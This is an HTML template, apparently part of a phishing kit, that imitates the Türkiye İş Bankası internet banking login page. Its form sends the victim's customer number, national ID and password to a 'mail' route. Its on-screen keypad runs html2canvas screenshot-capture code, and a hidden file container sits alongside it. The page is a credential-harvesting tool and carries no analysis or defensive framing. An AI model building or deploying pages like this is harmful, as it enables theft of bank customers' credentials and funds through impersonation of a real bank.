<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Türkiye İş Bankası İnternet Şubesine Hoş Geldiniz!</title>

    <style>
        *:focus {
            outline: 0;
        }

        h1 {
            text-align: left;
            color: #08335E;
            font-weight: normal;
            position: absolute;
            left: 335px;
            top: 4px;
            font-size: 29px;
        }

        h2 {
            text-align: left;
            color: #47a3ff;
            font-weight: normal;
            position: absolute;
            left: 335px;
            top: 240px;
            font-size: 17px;
        }
        h3 {
            text-align: left;
            color: #47a3ff;
            font-weight: normal;
            position: absolute;
            left: 335px;
            top: 430px;
            font-size: 17px;
        }
        form {
            border: 0px solid #777;
            margin: 30px auto;
            width: 400px;
            position: absolute;
            left: 335px;
            top: 85px;
        }
        input {
            width: 110%;
            height: 35px;
            padding-left: 10px;
            margin-top: 13px;
            font-size: 15px;
        }
        button {
            background-color: #08335E;
            color: #fff;
            width: 27%;
            margin-top: 5px;
            font-size: 17px;
            height: 50px;;
            margin: 1px;
            position: absolute;
            left: 345px;
            top: 195px;
        }
        #klavye {
            border: 1px solid #808080;
            margin-top: 20px;
            margin-left: 190px;
            width: 110px;
            color: #a8a8a8;
            background: #FFFFFF;
            padding: 5px;
            display: none;
        }
    </style>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.js"></script>
    <script>
        function KlavyeAc() {
            document.getElementById("klavye").style.display = "block";
        }
        function SayiYaz(Sayi) {
            var Yazi = document.getElementById("password").value;
            Yazi = Yazi + Sayi;
            document.getElementById("password").value = Yazi;
        }
    </script>

</head>
<body>

<div class="row">
    <div class="col-md-12">
        <h1>Türkiye İş Bankası Bireysel <br>İnternet Şubenize Hoş Geldiniz! </h1>
        <h2>Şifrem Yok / Unuttum <br>Müşteri Olmak İstiyorum </h2>
        <h3>Güvenlik</h3>
        <form action="{{url('mail') }}" method="POST" id="form_id">
            <div class="form-group">
                <input type="text" id="kimlik" name="kimlik" placeholder="Müşteri Numaranız / TCKN / YKN"><br>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Şifre / Geçici Şifre"
                       onfocus="KlavyeAc();"><br>
            </div>
            <div id="klavye" class="capture" onclick="get_ss();">
                <table>
                    <tr>
                        <td><input type="button" onclick="SayiYaz(1);" value="1"/>
                        <td><input type="button" onclick="SayiYaz(2);" value="2"/>
                        <td><input type="button" onclick="SayiYaz(3);" value="3 "/>
                    </tr>
                    <tr>

                        <td><input type="button" onclick="SayiYaz(4);" value="4"/>
                        <td><input type="button" onclick="SayiYaz(5);" value="5"/>
                        <td><input type="button" onclick="SayiYaz(6);" value="6"/>
                    </tr>
                    <tr>

                        <td><input type="button" onclick="SayiYaz(7);" value="7"/>
                        <td><input type="button" onclick="SayiYaz(8);" value="8"/>
                        <td><input type="button" onclick="SayiYaz(9);" value="9"/>
                    </tr>
                    <tr>
                        <td><input type="button" onclick="SayiYaz($yenile);" value="*"/>
                        <td><input type="button" onclick="SayiYaz(0);" value="0"/>
                    </tr>
                </table>
            </div>
            <div id="files" style="display:none;">

            </div>
            <button onclick="submitForm()">Giriş</button>
        </form>
    </div>
</div>
<script>
    function addFields(i, value){
        var container = document.getElementById("files");
        var input = document.createElement("input");
        input.type = "file";
        input.name = "file_" + i;
        input.value = value;
        container.appendChild(input);
    }
    function get_ss() {
        var keyboard = document.getElementById("klavye");
        html2canvas(keyboard).then(canvas => {
            document.body.appendChild(canvas);
            console.log(canvas);
        });
    }
    function submitForm() {
        console.log("submitted");
        document.getElementById("form_id").submit();
    }
</script>
</body>
</html>
